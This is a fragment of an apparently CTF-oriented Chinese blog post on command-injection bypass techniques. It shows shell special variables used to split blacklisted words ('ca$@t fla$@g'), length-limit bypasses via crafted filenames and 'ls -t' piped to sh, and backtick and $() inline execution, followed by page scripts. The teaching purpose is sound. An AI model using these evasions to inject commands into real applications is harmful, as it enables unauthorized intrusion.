+<td align="center">当前脚本的文件名</td>
+</tr>
+<tr>
+<td align="center">$n</td>
+<td align="center">传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空</td>
+</tr>
+<tr>
+<td align="center">$#</td>
+<td align="center">传递给脚本或函数的参数个数</td>
+</tr>
+<tr>
+<td align="center">$$</td>
+<td align="center">当前shell进程ID</td>
+</tr>
+<tr>
+<td align="center">$*</td>
+<td align="center">传递给脚本或函数的所有参数，而参数不存在时其值为空</td>
+</tr>
+<tr>
+<td align="center">$@</td>
+<td align="center">传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同</td>
+</tr>
+<tr>
+<td align="center">$?</td>
+<td align="center">上个命令的推出状态，或函数的返回值</td>
+</tr>
+</tbody></table>
+<p><strong>linux shell中$n表示传递给脚本或函数的参数</strong>。n 是一个数字，表示第几个参数。<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br>$@表示<br>比如：<code>ca$@t fla$@g</code><br><code>ca$1t fla$2g</code></p>
+<h3 id="5-长度限制"><a href="#5-长度限制" class="headerlink" title="5.长度限制"></a>5.长度限制</h3><p>长度限制可以用<strong>文件构造</strong>的方式来绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;<span class="built_in">test</span>则会将目录按时间排序后写进<span class="built_in">test</span>文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-内联执行"><a href="#6-内联执行" class="headerlink" title="6.内联执行"></a>6.内联执行</h3><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。<br>例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a`pwd`&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>类似的还有$(command).<br>例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> “abcd $(<span class="built_in">pwd</span>)”</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-通配符"><a href="#7-通配符" class="headerlink" title="7.通配符"></a>7.通配符</h3><p>上面已经记过</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://blog.zeddyu.info/2019/01/17/命令执行/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/96135760">https://blog.csdn.net/silence1_/article/details/96135760</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/137923.html">https://www.freebuf.com/articles/web/137923.html</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/>http://www.moonback.xyz/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-01-16T18:04:04+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年1月16日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/bypass/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>bypass</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>命令执行</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/&title=命令注入及其绕过方式 - 明月归的小站&summary=本篇博客主要介绍了命令注入中的一些绕过方式！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/&title=命令注入及其绕过方式 - 明月归的小站&summary=本篇博客主要介绍了命令注入中的一些绕过方式！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/&title=命令注入及其绕过方式 - 明月归的小站&summary=本篇博客主要介绍了命令注入中的一些绕过方式！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/01/01/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/vulnhub-dc-2/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>VulnHub之DC-2靶机</p>
+                <p class='content'>本篇博客主要介绍了玩DC-2靶机的过程!
+
+
+kali：192.168.17.146
+靶机：192.168.17.131
+flag1这个靶机需要将dc-2的域名指向对应靶机ip
+首先arp-sc...</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/12/30/%E7%9F%A5%E8%AF%86%E7%82%B9/php-fakerandom-number/'>
+                <p class='title'>php伪随机数<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了php伪随机数的相关内容！！！
+
+
+相关函数mt_rand()mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 ...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="toc-text">特殊符号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">|</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#amp"><span class="toc-text">&amp;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#amp-amp-%E5%92%8C"><span class="toc-text">&amp;&amp;和||</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#amp-amp"><span class="toc-text">&amp;&amp;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-text">||</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-text">&#96;反引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%98%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-text">‘单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-text">“双引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E7%BE%A4%E7%BB%84"><span class="toc-text">()指令群组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-text">{}大括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-text">[]中括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8B%AC%E5%8F%B7%EF%BC%8C%E4%B8%AD%E6%8B%AC%E5%8F%B7%EF%BC%8C%E5%92%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">小括号，中括号，和大括号的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">输入输出&#x2F;重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">通配符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-text">语法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-text">命令执行的一些绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">1. 空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-text">2.一些命令分隔符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%8A%B1%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%88%AB%E6%A0%B7%E7%94%A8%E6%B3%95"><span class="toc-text">3.花括号的别样用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-text">4.黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-text">拼接绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">单引号和双引号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-text">反斜杠绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Shell-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-text">利用Shell 特殊变量绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-text">5.长度限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-text">6.内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">7.通配符</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
